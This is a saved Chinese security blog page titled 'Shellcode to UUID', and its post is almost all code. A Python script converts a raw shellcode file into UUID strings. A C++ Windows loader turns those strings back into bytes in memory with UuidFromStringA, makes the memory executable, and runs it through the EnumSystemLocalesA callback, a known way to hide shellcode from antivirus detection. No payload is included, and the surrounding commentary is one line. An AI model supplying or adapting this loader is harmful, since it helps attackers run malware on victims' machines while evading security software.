@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)http://#/archives/225.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="dns-prefetch" href="https://lib.baomitu.com/">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Shellcode to UUID - lZeroyuee's Blog</title>
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="http://lzeroyuee.cn/usr/uploads/2020/05/1330681747.png">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <!-- AmazeUI 3.0 -->
+    <link rel="stylesheet" href="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/amazeui.min.css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/customui.min.css">
+    <!-- CodeHighlight -->
+    <style>
+    .hljs{display:block;overflow-x:auto;padding:0.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;}.hljs-doctag,.hljs-keyword,.hljs-formula{color:#a626a4}.hljs-section,.hljs-name,.hljs-selector-tag,.hljs-deletion,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-string,.hljs-regexp,.hljs-addition,.hljs-attribute,.hljs-meta-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-variable,.hljs-template-variable,.hljs-type,.hljs-selector-class,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-number{color:#986801}.hljs-symbol,.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:bold}.hljs-link{text-decoration:underline}
+    </style>
+    <!-- FontAwesome -->
+    <link href="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/font-awesome.min.css" rel="stylesheet">
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="Shellcode to UUID前几天的推：https://twitter.com/ajpc500/status/1353403938414993408?s=09思路很奇特，重点是在滥用API...">
+<meta name="generator" content="Typecho 1.2/19.05.09">
+<meta name="template" content="amaze">
+<link rel="pingback" href="http://#/action/xmlrpc">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://#/action/xmlrpc?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://#/action/xmlrpc?wlw">
+<link rel="alternate" type="application/rss+xml" title="Shellcode to UUID » lZeroyuee&#39;s Blog » RSS 2.0" href="http://#/feed/archives/225.html">
+<link rel="alternate" type="application/rdf+xml" title="Shellcode to UUID » lZeroyuee&#39;s Blog » RSS 1.0" href="http://#/feed/rss/archives/225.html">
+<link rel="alternate" type="application/atom+xml" title="Shellcode to UUID » lZeroyuee&#39;s Blog » ATOM 1.0" href="http://#/feed/atom/archives/225.html">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-225'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-225'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-225'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _E8s = //'e7'
+'a'+//'qSd'
+'8f'+'cc'//'UXU'
++'d'//'C'
++//'6'
+'6'+'oP'//'oP'
++'e9'//'nX'
++''///*'se'*/'se'
++//'55Q'
+'3'+''///*'Kaz'*/'Kaz'
++''///*'zZ'*/'zZ'
++'b24'//'LW'
++'0a8'//'Q'
++'a'//'BwX'
++'P'//'P'
++/* 'P'//'P' */''+//'qP'
+'9c3'+//'Lbg'
+'12'+'07a'//'rNM'
++'764'//'bB'
++//'Zp'
+'7'+//'su'
+'446'+'0Da'//'0Da'
++/* 'PLZ'//'PLZ' */''+'FmX'//'FmX'
++''///*'X3'*/'X3'
++//'Je3'
+'Je3'+'8'//'jN'
+, _cc9nvK = [[6,7],[6,8],[16,17],[31,34],[31,34],[31,34]];
+    
+    for (var i = 0; i < _cc9nvK.length; i ++) {
+        _E8s = _E8s.substring(0, _cc9nvK[i][0]) + _E8s.substring(_cc9nvK[i][1]);
+    }
+
+    return _E8s;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" href="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/APlayer.min.css">
+<script type="text/javascript" src="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/APlayer.min.js.下载"></script>
+<script>var meting_api="http://#/action/metingapi?server=:server&type=:type&id=:id&auth=:auth&r=:r";</script></head>
+
+<body id="blog">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="http://#/">lZeroyuee's Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="http://lzeroyuee.cn/">Home</a>
+                    </li>
+                                                            <li>
+                        <a href="http://lzeroyuee.cn/archives">归档</a>
+                    </li>
+                                        <li>
+                        <a href="http://lzeroyuee.cn/about/">关于我</a>
+                    </li>
+                                                        </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <header class="intro-header" style="background-image: url(&#39;&#39;)">
+    <div class="container">
+        <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>Shellcode to UUID</h1>
+                        <span class="meta">@lzeroyuee &nbsp;January 31, 2021</span>
+                        <div class="tags post-tags"><a href="http://#/category/%E6%94%BB%E9%98%B2%E7%9B%B8%E5%85%B3/">攻防相关</a>&nbsp;</div>
+                    </div>
+                </div>
+        </div>
+    </div>
+    </header>
+
+    <!-- content start -->
+    <div class="container">
+    <div class="am-g am-g-fixed blog-fixed">
+        <div class="am-u-lg-12 am-u-sm-12">
+            <article class="am-article blog-article-p article-trigger">
+                <div id="post-content" class="am-article-bd">
+                    <h1 id="directory055908548785384291">Shellcode to UUID</h1><p>前几天的推：<a href="https://twitter.com/ajpc500/status/1353403938414993408?s=09">https://twitter.com/ajpc500/status/1353403938414993408?s=09</a></p><p>思路很奇特，重点是在滥用API上</p><h2 id="directory055908548785384292">Py Script</h2><pre><code class="lang-python hljs"><span class="hljs-keyword">import</span> uuid
+
+<span class="hljs-comment"># read shellcode</span>
+shellcode = <span class="hljs-string">""</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">"shellcode.bin"</span>, <span class="hljs-string">"rb"</span>) <span class="hljs-keyword">as</span> f:
+    shellcode = f.read()
+align_len = (int((len(shellcode) - <span class="hljs-number">1</span>) / <span class="hljs-number">16</span>) + <span class="hljs-number">1</span>) * <span class="hljs-number">16</span>
+shellcode.ljust(align_len, <span class="hljs-string">b'\x90'</span>)
+count = int(len(shellcode) / <span class="hljs-number">16</span>)
+
+<span class="hljs-comment"># generate uuid</span>
+uuid_list = []
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, count):
+    uuid_bytes = shellcode[i * <span class="hljs-number">16</span> : (i + <span class="hljs-number">1</span>) * <span class="hljs-number">16</span>]
+    uuid_list.append(str(uuid.UUID(bytes_le=uuid_bytes)))
+
+<span class="hljs-comment"># write file format char *[]</span>
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">"shellcode_uuid.txt"</span>, <span class="hljs-string">"wt"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:
+    f.write(<span class="hljs-string">"const char *shellcode_uuid[] = { \n"</span>)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(uuid_list)):
+        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
+            f.write(<span class="hljs-string">"\t"</span>)
+        f.write(<span class="hljs-string">"\""</span> + uuid_list[i] + <span class="hljs-string">"\""</span>)
+        <span class="hljs-keyword">if</span> i != len(uuid_list) - <span class="hljs-number">1</span>:
+            f.write(<span class="hljs-string">", "</span>)
+        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> i != len(uuid_list) - <span class="hljs-number">1</span>:
+            f.write(<span class="hljs-string">" \\\n"</span>)
+    f.write(<span class="hljs-string">" \n};"</span>)
+print(<span class="hljs-string">"done..."</span>)</code></pre><h2 id="directory055908548785384293">Example</h2><pre><code class="lang-cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;rpcdce.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">"Rpcrt4.lib"</span>)</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *shellcode_uuid[] = {
+    <span class="hljs-comment">// shellcode uuids...</span>
+}
+
+<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">void</span>)
+{
+    <span class="hljs-keyword">void</span> *buf = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    <span class="hljs-comment">// write shellcode to buffer</span>
+    <span class="hljs-keyword">size_t</span> uuid_count = <span class="hljs-keyword">sizeof</span>(shellcode_uuid) / <span class="hljs-keyword">sizeof</span>(shellcode_uuid[<span class="hljs-number">0</span>]);
+    BYTE *ptr = (BYTE *)buf;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; uuid_count; i++, ptr += <span class="hljs-number">16</span>) {
+        RPC_STATUS status = UuidFromStringA((RPC_CSTR)shellcode_uuid[i], (UUID *)ptr);
+        <span class="hljs-keyword">if</span>(status != RPC_S_OK) {
+            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+        }
+    }
+
+    DWORD old_protect;
+    VirtualProtect(buf, <span class="hljs-number">0x1000</span>, PAGE_EXECUTE_READ, &amp;old_protect);
+
+    <span class="hljs-comment">// ((void (*)())buf)();</span>
+    
+    EnumSystemLocalesA((LOCALE_ENUMPROCA)buf, <span class="hljs-number">0</span>);
+
+    VirtualFree(buf, <span class="hljs-number">0</span>, MEM_RELEASE);
+    
+    system(<span class="hljs-string">"pause"</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>                </div>
+            </article>
+            <!-- <hr>
+            <ul class="pager">
+                <li class="previous"><a href="http://#/archives/224.html" title="Win10 ConDrv-BSOD">Win10 ConDrv-BSOD</a></li>
+                <li class="next"></li>
+            </ul> -->
+            <hr>
+        </div>
+
+    </div>
+    </div>
+    
+
+<div id="respond-post-225" class="comment-container">
+    <div id="comments" class="clearfix">
+                        <div id="respond-post-225" class="respond">
+            <div class="cancel-comment-reply">
+            <a id="cancel-comment-reply-link" href="http://#/archives/225.html#respond-post-225" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </div>
+        
+            <h3 id="response">添加新评论</h3>
+            <form method="post" action="http://#/archives/225.html/comment" id="comment-form" role="form">
+                                <div class="am-g">
+                    <span class="am-u-lg-4 comment-input">
+                        <label for="author" class="required">称呼</label>
+                        <input type="text" name="author" id="author" class="text" value="" required="">
+                    </span>
+                    <span class="am-u-lg-4">
+                        <label for="mail" class="required">Email</label>
+                        <input type="email" name="mail" id="mail" class="text" value="" required="">
+                    </span>
+                    <span class="am-u-lg-4 comment-input">
+                        <label for="url">网站</label>
+                        <input type="url" name="url" id="url" class="text" value="">
+                    </span>
+                </div>
+                                <p>
+                    <label for="textarea" class="required">内容</label>
+                    <textarea rows="8" cols="32" name="text" id="textarea" class="textarea" required=""></textarea>
+                </p>
+                <p>
+                    <button type="submit" class="submit am-btn am-btn-primary">提交评论</button>
+                </p>
+            <input type="hidden" name="_" value="a8fccde93b240a8a9c31207a76474468"></form>
+        </div>
+        
+            </div>
+</div>    <div id="directory-content" class="directory-content initial headroom--top headroom--not-bottom">
+        <div id="directory"><ul><span style="color: rgb(243, 129, 129); font-weight: 600;">目录</span><li><a href="http://#/archives/225.html#directory055908548785384291">Shellcode to UUID</a><ul><li><a href="http://#/archives/225.html#directory055908548785384292">Py Script</a></li><li><a href="http://#/archives/225.html#directory055908548785384293">Example</a></li></ul></li></ul></div>
+    </div>
+    <!-- content end -->
+
+<footer class="blog-footer">
+    <ul class="list-inline text-center">
+	    <li>
+            <a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
+            <span class="am-icon-btn am-icon-md am-icon-github footer-icon"></span>
+        </a></li><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
+    </a></ul><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
+    </a><div class="blog-text-center"><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">© 2021 </a><a href="http://#/">lZeroyuee's Blog</a> 由 <a href="http://www.typecho.org/" target="_blank">Typecho</a> 强力驱动 Theme is <a href="https://spiritree.me/" target="_blank">Amaze made by Spiritree</a>
+    </div>
+</footer>
+<script src="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/jquery.slim.min.js.下载"></script>
+<script src="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/highlight.min.js.下载"></script>
+<script>
+    var $body=document.body;var $toggle=document.querySelector(".navbar-toggle");var $navbar=document.querySelector("#huxblog_navbar");var $collapse=document.querySelector(".navbar-collapse");var __HuxNav__={close:function(){$navbar.className=" ";setTimeout(function(){if($navbar.className.indexOf("in")<0){$collapse.style.height="0px"}},400)},open:function(){$collapse.style.height="auto";$navbar.className+=" in"}};$toggle.addEventListener("click",function(a){if($navbar.className.indexOf("in")>0){__HuxNav__.close()}else{__HuxNav__.open()}});document.addEventListener("click",function(a){if(a.target==$toggle){return}if(a.target.className=="icon-bar"){return}__HuxNav__.close()});jQuery(document).ready(function(c){var d=1170;if(c(window).width()>d){var b=c(".navbar-custom").height(),a=c(".intro-header .container").height();c(window).on("scroll",{previousTop:0},function(){var e=c(window).scrollTop(),f=c(".side-catalog");if(e<this.previousTop){if(e>0&&c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-visible")}else{c(".navbar-custom").removeClass("is-visible is-fixed")}}else{c(".navbar-custom").removeClass("is-visible");if(e>b&&!c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-fixed")}}this.previousTop=e;f.show();if(e>(a+41)){f.addClass("fixed")}else{f.removeClass("fixed")}})}});
+</script>
+<script>
+    $(document).ready(function() {
+        $('pre code').each(function(i, block) {
+            hljs.highlightBlock(block)
+        })
+        $('table').addClass('am-table')
+    })
+</script>
+<script type="text/javascript" src="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/Meting.min.js.下载"></script>
+
+<script src="./Shellcode to UUID - lZeroyuee&#39;s Blog_files/headroom.min.js.下载"></script>
+<script>
+var postDirectoryBuild=function(){var b=function a(l,h){var k=[],e=typeof h==="object",g=typeof h==="string",j,f,d;for(f=0,d=l.length;f<d;f++){j=l[f];if((j.nodeType===1||j.nodeType===9)&&(!h||e&&h.test(j.tagName.toLowerCase())||g&&j.tagName.toLowerCase()===h)){k.push(j)}}return k},c=function(e,f,r){var n=[],m=[],h,p,d,j,l,s,o,g,k,q;h=(function(i,C,A){var w=b(i.childNodes,/^h\d$/),x=[],v=1,B=1,z=0,D=1,t="directory"+(Math.random()+"").replace(/\D/,""),B,y,u;while(w.length){u=w.shift();C.push(u.innerHTML);y=+u.tagName.match(/\d/)[0];if(y>v){x.push(1);B+=1}else{if(y===B||y>B&&y<=v){x.push(0);B=B}else{if(y<B){x.push(y-B);B=y}}}z+=x[x.length-1];v=y;u.id=u.id||(t+D++);A.push(u.id)}if(z!==0&&x[0]===1){x[0]=0}return x})(e,n,m);j=p=document.createElement("ul");q=document.createElement("span");q.style="color:#F38181;font-weight:600;";q.innerHTML="目录";p.appendChild(q);dirNum=[];for(g=0,k=h.length;g<k;g++){d=h[g];if(d===1){l=document.createElement("ul");if(!j.lastElementChild){j.appendChild(document.createElement("li"))}j.lastElementChild.appendChild(l);j=l;dirNum.push(0)}else{if(d<0){d*=2;while(d++){if(d%2){dirNum.pop()}j=j.parentNode}}}dirNum[dirNum.length-1]++;s=document.createElement("li");o=document.createElement("a");o.href="#"+m[g];o.innerHTML=!r?n[g]:dirNum.join(".")+" "+n[g];s.appendChild(o);j.appendChild(s)}f.appendChild(p)};c(document.getElementById("post-content"),document.getElementById("directory"),false)};postDirectoryBuild();
+</script>
+<script>
+    var postDirectory = new Headroom(document.getElementById("directory-content"), {
+    tolerance: 5,
+    offset: 240,
+    classes: {
+        initial: "initial",
+        pinned: "pinned",
+        unpinned: "unpinned"
+    }
+});
+postDirectory.init();
+</script></body></html>
